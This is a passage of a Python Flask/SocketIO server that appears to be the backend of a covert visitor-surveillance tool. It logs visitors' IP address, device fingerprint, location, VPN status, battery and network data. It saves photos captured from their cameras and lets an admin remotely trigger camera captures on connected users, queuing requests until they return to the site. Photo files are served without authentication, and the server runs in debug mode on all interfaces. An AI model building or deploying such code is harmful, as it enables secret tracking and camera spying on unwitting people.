        c.execute('SELECT COUNT(*) FROM captured_photos')
        photo_count = c.fetchone()[0]

        # Get all photo filenames to delete files
        c.execute('SELECT filepath FROM captured_photos')
        photo_files = c.fetchall()

        # Delete all data from tables
        c.execute('DELETE FROM collected_data')
        c.execute('DELETE FROM captured_photos')

        # Reset auto-increment counters by deleting from sqlite_sequence
        c.execute("DELETE FROM sqlite_sequence WHERE name='collected_data'")
        c.execute("DELETE FROM sqlite_sequence WHERE name='captured_photos'")

        conn.commit()
        conn.close()

        # Delete photo files from disk
        deleted_files = 0
        for photo_file in photo_files:
            filepath = photo_file[0]
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
                    deleted_files += 1
            except Exception as e:
                print(f"Warning: Could not delete file {filepath}: {e}")

        print(f"\n{'='*60}")
        print(f"[ADMIN ACTION] DATABASE RESET")
        print(f"Deleted {data_count} data entries")
        print(f"Deleted {photo_count} photo records")
        print(f"Deleted {deleted_files} photo files from disk")
        print(f"Auto-increment counters reset to 1")
        print(f"{'='*60}\n")

        return jsonify({
            'status': 'success',
            'message': f'Database reset complete. Deleted {data_count} data entries, {photo_count} photos, and {deleted_files} files. IDs will start from 1.',
            'data_count': data_count,
            'photo_count': photo_count,
            'files_deleted': deleted_files
        }), 200
    except Exception as e:
        print(f"Error resetting database: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/debug/last-entry')
def debug_last_entry():
    """Debug endpoint to view the last collected entry"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY id DESC LIMIT 1')
    row = c.fetchone()
    conn.close()

    if not row:
        return jsonify({'message': 'No data collected yet'}), 404

    entry = {
        'id': row[0],
        'timestamp': row[1],
        'ip_address': row[2],
        'user_agent': row[3],
        'device_info': json.loads(row[4]) if row[4] else {},
        'fingerprint': row[5],
        'location_data': json.loads(row[6]) if row[6] else {},
        'storage_info': json.loads(row[7]) if row[7] else {},
        'connection_info': json.loads(row[8]) if row[8] else {},
        'vpn_detection': json.loads(row[9]) if row[9] else {},
        'raw_data_preview': (row[10] or '')[:500] + '...' if row[10] and len(row[10]) > 500 else row[10],
        'battery_info': json.loads(row[11]) if row[11] else {},
        'network_info': json.loads(row[12]) if row[12] else {},
        'media_devices': json.loads(row[13]) if row[13] else {},
        'camera_permission': json.loads(row[14]) if row[14] else {}
    }

    return jsonify(entry), 200

@app.route('/api/save-photo', methods=['POST'])
def save_photo():
    """API endpoint to save captured photos"""
    try:
        if 'photo' not in request.files:
            return jsonify({'status': 'error', 'message': 'No photo file provided'}), 400

        photo = request.files['photo']
        timestamp_str = request.form.get('timestamp', datetime.now().isoformat())
        fingerprint = request.form.get('fingerprint', '')
        photo_ip = request.form.get('ip_address', '')
        capture_source = request.form.get('capture_source', 'unknown')

        # Allow explicit data_entry_id from frontend (for per-user captures)
        data_entry_id = request.form.get('data_entry_id', None)
        if data_entry_id:
            data_entry_id = int(data_entry_id)

        if photo.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Use the IP address from frontend if provided, otherwise get from request
        if photo_ip:
            client_ip = photo_ip
        else:
            client_ip = get_client_ip()

        # Generate unique filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        safe_ip = client_ip.replace('.', '_').replace(':', '_')
        filename = f'photo_{timestamp}_{safe_ip}.jpg'
        filepath = os.path.join(PHOTOS_FOLDER, filename)

        # Save the photo
        photo.save(filepath)
        file_size = os.path.getsize(filepath)

        # Get client info
        user_agent = request.headers.get('User-Agent', '')

        # Try to find matching data entry by fingerprint (only if not explicitly provided)
        if not data_entry_id and fingerprint:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
            result = c.fetchone()
            if result:
                data_entry_id = result[0]
            conn.close()

        # Store metadata in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO captured_photos
                     (timestamp, filename, filepath, ip_address, user_agent, file_size, fingerprint, data_entry_id, capture_source)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (timestamp_str, filename, filepath, client_ip, user_agent, file_size, fingerprint, data_entry_id, capture_source))
        photo_id = c.lastrowid
        conn.commit()
        conn.close()

        # Enhanced logging
        print(f"\n{'='*60}")
        print(f"[PHOTO CAPTURED]")
        print(f"Photo ID: {photo_id}")
        print(f"Capture Source: {capture_source}")
        print(f"Timestamp: {timestamp_str}")
        print(f"Filename: {filename}")
        print(f"File Size: {file_size} bytes")
        print(f"IP Address: {client_ip}")
        print(f"Fingerprint: {fingerprint[:16]}..." if fingerprint else "N/A")
        print(f"Linked to Data Entry: {data_entry_id}" if data_entry_id else "Not linked")
        print(f"Saved to: {filepath}")
        print(f"{'='*60}\n")

        return jsonify({
            'status': 'success',
            'message': 'Photo saved successfully',
            'photo_id': photo_id,
            'filename': filename,
            'file_size': file_size,
            'data_entry_id': data_entry_id
        }), 200

    except Exception as e:
        print(f"Error saving photo: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/photos')
def admin_photos():
    """Admin page to view all captured photos"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM captured_photos ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    photos = []
    for row in rows:
        photos.append({
            'id': row[0],
            'timestamp': row[1],
            'filename': row[2],
            'filepath': row[3],
            'ip_address': row[4],
            'user_agent': row[5],
            'file_size': row[6],
            'fingerprint': row[7] if len(row) > 7 else None,
            'data_entry_id': row[8] if len(row) > 8 else None,
            'capture_source': row[9] if len(row) > 9 else 'unknown'
        })

    return render_template('photos.html', photos=photos, count=len(photos))

@app.route('/captured_photos/<filename>')
def serve_photo(filename):
    """Serve captured photo files"""
    from flask import send_from_directory
    return send_from_directory(PHOTOS_FOLDER, filename)

# WebSocket handlers for photo requests
# Store active users: {entry_id: {socket_id: sid, fingerprint: fp}}
active_users = {}
# Store pending photo requests: {entry_id: [request_data, ...]}
pending_photo_requests = {}

@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    print(f"[WEBSOCKET] Client connected: {request.sid}")

@socketio.on('ping')
def handle_ping(data):
    """Handle periodic ping from client to keep connection alive"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    
    if entry_id and entry_id in active_users:
        # Update last ping time
        active_users[entry_id]['last_ping'] = datetime.now().isoformat()
        # Update socket_id in case it changed (reconnection)
        active_users[entry_id]['socket_id'] = request.sid
        print(f"[WEBSOCKET] Ping received from entry {entry_id}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnection"""
    print(f"[WEBSOCKET] Client disconnected: {request.sid}")
    # Remove from active users
    for entry_id, user_info in list(active_users.items()):
        if user_info.get('socket_id') == request.sid:
            del active_users[entry_id]
            print(f"[WEBSOCKET] Removed user entry {entry_id}")
            
            # Broadcast user status update to admin dashboard
            emit('user_status_update', {
                'entry_id': entry_id,
                'is_online': False
            }, broadcast=True, include_self=False)

@socketio.on('register_user')
def handle_register_user(data):
    """Register a user when they connect (for photo requests)"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    
    if entry_id:
        # Update or create user registration
        # This handles re-registration after reconnection
        was_online = entry_id in active_users
        
        active_users[entry_id] = {
            'socket_id': request.sid,
            'fingerprint': fingerprint,
            'registered_at': datetime.now().isoformat(),
            'last_ping': datetime.now().isoformat()
        }
        join_room(f'user_{entry_id}')
        print(f"[WEBSOCKET] Registered user entry {entry_id} with fingerprint {fingerprint[:16]}...")
        
        # Broadcast user status update to admin dashboard (only if status changed)
        if not was_online:
            emit('user_status_update', {
                'entry_id': entry_id,
                'is_online': True
            }, broadcast=True, include_self=False)
        
        # Check if there are any pending photo requests for this user
        if entry_id in pending_photo_requests:
            # Send all pending requests
            for request_data in pending_photo_requests[entry_id]:
                emit('photo_request', {
                    'entry_id': entry_id,
                    'fingerprint': fingerprint,
                    'requested_at': request_data.get('requested_at', datetime.now().isoformat())
                }, room=f'user_{entry_id}')
                print(f"[WEBSOCKET] Sent pending photo request to entry {entry_id}")
            # Clear pending requests
            del pending_photo_requests[entry_id]
        
        emit('user_registered', {'entry_id': entry_id, 'status': 'success'})
    else:
        emit('registration_error', {'error': 'Entry ID required'})

@socketio.on('request_photo')
def handle_request_photo(data):
    """Admin requests a photo from a specific user"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    
    if not entry_id and not fingerprint:
        emit('photo_request_error', {'error': 'Entry ID or fingerprint required'})
        return
    
    # Find user by entry_id or fingerprint
    target_socket_id = None
    target_entry_id = None
    
    if entry_id and entry_id in active_users:
        target_socket_id = active_users[entry_id]['socket_id']
        target_entry_id = entry_id
    elif fingerprint:
        # Search by fingerprint
        for eid, user_info in active_users.items():
            if user_info.get('fingerprint') == fingerprint:
                target_socket_id = user_info['socket_id']
                target_entry_id = eid
                break
    
    if target_socket_id and target_entry_id:
        # Send photo request to the user
        request_data = {
            'entry_id': target_entry_id,
            'fingerprint': fingerprint,
            'requested_at': datetime.now().isoformat()
        }
        emit('photo_request', request_data, room=f'user_{target_entry_id}')
        print(f"[WEBSOCKET] Photo request sent to entry {target_entry_id}")
        emit('photo_requested', {
            'entry_id': target_entry_id,
            'status': 'sent',
            'message': 'Photo request sent to user'
        })
    else:
        # User not online - store request as pending
        # Try to find entry_id by fingerprint if not provided
        if not entry_id and fingerprint:
            # Search database for entry with this fingerprint
            try:
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
                result = c.fetchone()
                conn.close()
                if result:
                    entry_id = result[0]
            except Exception as e:
                print(f"[WEBSOCKET] Error looking up fingerprint: {e}")
        
        if entry_id:
            # Store as pending request
            if entry_id not in pending_photo_requests:
                pending_photo_requests[entry_id] = []
            pending_photo_requests[entry_id].append({
                'entry_id': entry_id,
                'fingerprint': fingerprint,
                'requested_at': datetime.now().isoformat()
            })
            print(f"[WEBSOCKET] User not online, stored pending photo request for entry {entry_id}")
            emit('photo_requested', {
                'entry_id': entry_id,
                'status': 'pending',
                'message': 'Photo request stored. Will be sent when user comes online.'
            })
        else:
            error_msg = f"User not found (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
            print(f"[WEBSOCKET] {error_msg}")
            emit('photo_request_error', {
                'error': error_msg,
                'suggestion': 'The user may not be currently on the website. Photo will be captured automatically when they visit.'
            })

if __name__ == '__main__':
    socketio.run(app, debug=True, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)